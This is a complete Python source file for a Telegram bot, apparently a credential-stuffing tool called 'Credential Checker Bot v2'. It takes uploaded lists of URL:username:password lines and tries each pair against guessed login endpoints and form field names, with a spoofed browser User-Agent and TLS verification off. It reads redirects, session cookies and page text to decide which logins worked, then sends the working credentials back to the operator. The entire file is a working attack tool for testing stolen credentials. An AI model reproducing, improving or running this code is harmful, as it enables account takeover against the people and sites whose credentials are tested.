import os
import sys
import logging
import threading
import aiohttp
import asyncio
import re
import json
from datetime import datetime
from urllib.parse import urljoin, urlparse

# Fix for Pyrogram on Python 3.14+
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS

# --- Configuration ---
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# --- Security Middleware ---
def is_admin(user_id):
    if not ALLOWED_USERS:
        return False
    return user_id in ALLOWED_USERS

# --- Flask Health Server ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot is running and healthy.", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting Flask health server on port {port}")
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# --- Credential Parser ---
def parse_credential_line(line):
    """Parse line in format: URL:email/username:password"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    parts = line.split(':')
    if len(parts) < 3:
        return None
    
    url = parts[0]
    password = ':'.join(parts[2:])
    username = ':'.join(parts[1:-1])
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    return (url, username, password)

# --- Better Credential Checking Logic ---
async def check_credential(session, url, username, password):
    """
    Improved credential checker with multiple validation methods
    Returns: (is_valid, debug_info)
    """
    
    # First, try to find the actual login endpoint
    login_endpoints = [
        url,
        url.rstrip('/') + '/login',
        url.rstrip('/') + '/auth/login',
        url.rstrip('/') + '/api/login',
        url.rstrip('/') + '/signin',
        url.rstrip('/') + '/authenticate',
    ]
    
    # Common field name combinations
    field_combos = [
        {'username': username, 'password': password},
        {'email': username, 'password': password},
        {'user': username, 'password': password},
        {'login': username, 'password': password},
        {'Username': username, 'Password': password},
        {'Email': username, 'Password': password},
        {'user_login': username, 'user_pass': password},
        {'log': username, 'pwd': password},
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': url
    }
    
    for endpoint in login_endpoints:
        for payload in field_combos:
            try:
                # Store cookies to track session
                async with session.post(
                    endpoint,
                    data=payload,
                    headers=headers,
                    allow_redirects=True,
                    timeout=20,
                    ssl=False  # Some sites have SSL issues
                ) as response:
                    
                    final_url = str(response.url)
                    status = response.status
                    text = await response.text()
                    text_lower = text.lower()
                    
                    # Get cookies
                    cookies = response.cookies
                    has_session_cookie = any(
                        name.lower() in str(cookies).lower() 
                        for name in ['session', 'token', 'auth', 'sid', 'jwt', 'id', 'user']
                    )
                    
                    # === STRICT VALIDATION CHECKS ===
                    
                    # 1. Check if redirected AWAY from login page (GOOD SIGN)
                    parsed_original = urlparse(endpoint)
                    parsed_final = urlparse(final_url)
                    
                    login_keywords = ['login', 'signin', 'auth', 'authenticate', 'log-in', 'sign-in']
                    is_still_on_login = any(kw in parsed_final.path.lower() for kw in login_keywords)
                    moved_away_from_login = not is_still_on_login and parsed_original.path != parsed_final.path
                    
                    # 2. Check for failure indicators (BAD)
                    failure_patterns = [
                        'invalid', 'incorrect', 'wrong password', 'wrong username',
                        'authentication failed', 'login failed', 'sign in failed',
                        'invalid credentials', 'access denied', 'unauthorized',
                        'error', 'failed', 'try again', 'does not exist',
                        'account locked', 'suspended', 'banned', 'not found',
                        'password is incorrect', 'username is incorrect',
                        'email or password is incorrect', 'invalid email',
                        'invalid username', 'invalid password'
                    ]
                    
                    has_failure = any(pattern in text_lower for pattern in failure_patterns)
                    
                    # 3. Check for success indicators (GOOD)
                    success_patterns = [
                        'logout', 'sign out', 'log out', 'my account',
                        'profile', 'dashboard', 'welcome back', 'hello,',
                        'settings', 'account settings', 'personal info',
                        'you are logged in', 'successfully logged in',
                        'login successful', 'authentication successful'
                    ]
                    
                    has_success = any(pattern in text_lower for pattern in success_patterns)
                    
                    # 4. Check response size (login error pages are usually smaller)
                    content_length = len(text)
                    
                    # 5. Check for JSON success response
                    is_json_success = False
                    try:
                        json_data = json.loads(text)
                        if isinstance(json_data, dict):
                            # Check for token/session in response
                            if any(k in json_data for k in ['token', 'access_token', 'session', 'user', 'data', 'success']):
                                if json_data.get('success') == True or 'token' in json_data:
                                    is_json_success = True
                            # Check for error in JSON
                            if 'error' in json_data or json_data.get('success') == False:
                                has_failure = True
                    except:
                        pass
                    
                    # === DECISION LOGIC ===
                    
                    # Strong indicators of SUCCESS:
                    strong_success = (
                        (moved_away_from_login and has_session_cookie and not has_failure) or
                        (has_session_cookie and has_success and not has_failure) or
                        is_json_success
                    )
                    
                    # Strong indicators of FAILURE:
                    strong_failure = (
                        has_failure or
                        (is_still_on_login and has_failure) or
                        (status == 401 or status == 403)
                    )
                    
                    # Build debug info
                    debug_info = {
                        'endpoint': endpoint,
                        'status': status,
                        'final_url': final_url,
                        'moved_away': moved_away_from_login,
                        'has_session': has_session_cookie,
                        'has_success_text': has_success,
                        'has_failure_text': has_failure,
                        'content_length': content_length,
                        'is_json_success': is_json_success
                    }
                    
                    if strong_success:
                        return (True, debug_info)
                    
                    if strong_failure:
                        return (False, debug_info)
                    
                    # Ambiguous case - log for debugging
                    logger.info(f"Ambiguous result for {url} - needs manual check")
                    
            except Exception as e:
                continue
    
    # If all attempts failed
    return (False, {'error': 'All login attempts failed'})

# --- Main Processing Function ---
async def process_credentials(client: Client, message: Message, file_path: str):
    """Process the credential file and send results"""
    chat_id = message.chat.id
    
    # Read file
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await message.reply_text(f"❌ Error reading file: {str(e)}")
        return
    
    # Parse credentials
    credentials = []
    for line_num, line in enumerate(lines, 1):
        parsed = parse_credential_line(line)
        if parsed:
            credentials.append((line_num, parsed[0], parsed[1], parsed[2]))
    
    total = len(credentials)
    
    if total == 0:
        await message.reply_text("❌ No valid credentials found in file.\nFormat: URL:username:password")
        return
    
    await message.reply_text(f"🔍 Found {total} credentials to check. Starting...")
    
    valid_results = []
    invalid_results = []
    checked = 0
    last_progress = 0
    
    # Create session with cookie persistence
    connector = aiohttp.TCPConnector(limit=30, limit_per_host=5, ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    cookie_jar = aiohttp.CookieJar()
    
    async with aiohttp.ClientSession(
        connector=connector, 
        timeout=timeout,
        cookie_jar=cookie_jar
    ) as session:
        
        for line_num, url, username, password in credentials:
            is_valid, debug_info = await check_credential(session, url, username, password)
            
            log_entry = f"{url}:{username}:{password}"
            
            if is_valid:
                valid_results.append(log_entry)
                logger.info(f"✅ VALID: {url} | {username}")
            else:
                invalid_results.append(f"{log_entry} | Debug: {debug_info}")
                logger.info(f"❌ INVALID: {url} | {username}")
            
            checked += 1
            progress = int((checked / total) * 100)
            
            # Send progress every 10%
            if progress >= last_progress + 10:
                last_progress = (progress // 10) * 10
                await message.reply_text(
                    f"⏳ Progress: {last_progress}% ({checked}/{total})\n"
                    f"✅ Valid: {len(valid_results)} | ❌ Invalid: {len(invalid_results)}"
                )
            
            # Delay to avoid rate limiting
            await asyncio.sleep(1)
    
    # Send final results
    summary = (
        f"✅ **Check Complete!**\n\n"
        f"📊 Total: {total}\n"
        f"✅ Valid: {len(valid_results)}\n"
        f"❌ Invalid: {len(invalid_results)}"
    )
    await message.reply_text(summary)
    
    # Save valid credentials
    if valid_results:
        result_file = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(result_file, 'w') as f:
            f.write('\n'.join(valid_results))
        
        await message.reply_document(
            result_file, 
            caption=f"📁 Valid Credentials ({len(valid_results)})"
        )
        os.remove(result_file)
    else:
        await message.reply_text("❌ No valid credentials found.")
    
    # Optionally save invalid with debug info for troubleshooting
    if len(invalid_results) > 0:
        debug_file = f"debug_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(debug_file, 'w') as f:
            f.write('\n'.join(invalid_results[:50]))  # First 50 only
        
        await message.reply_document(
            debug_file,
            caption="🐛 Debug info (first 50 invalid)"
        )
        os.remove(debug_file)
    
    # Cleanup
    os.remove(file_path)

# --- Bot Handlers ---
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return

    await message.reply_text(
        "👨‍💻 **Credential Checker Bot v2**\n\n"
        "**Format:** `URL:username:password`\n\n"
        "**Example:**\n"
        "`https://site.com/login:myuser:mypass`\n\n"
        "✅ **Improved Detection:**\n"
        "- Checks multiple login endpoints\n"
        "- Validates session cookies\n"
        "- Detects actual redirects\n"
        "- Parses JSON responses\n"
        "- Filters out false positives"
    )

@app.on_message(filters.document)
async def handle_document(client, message: Message):
    if not is_admin(message.from_user.id):
        return
    
    file_name = message.document.file_name
    if not file_name.endswith('.txt'):
        await message.reply_text("❌ Send `.txt` file only.")
        return
    
    try:
        file_path = await message.download()
    except Exception as e:
        await message.reply_text(f"❌ Download failed: {str(e)}")
        return
    
    await message.reply_text("📥 File received. Checking credentials...")
    await process_credentials(client, message, file_path)

@app.on_message(filters.private & ~filters.document & ~filters.command("start"))
async def private_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return
    await message.reply_text("Send a `.txt` file or use /start")

# --- Main Execution ---
if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    logger.info("Bot starting...")
    app.run()
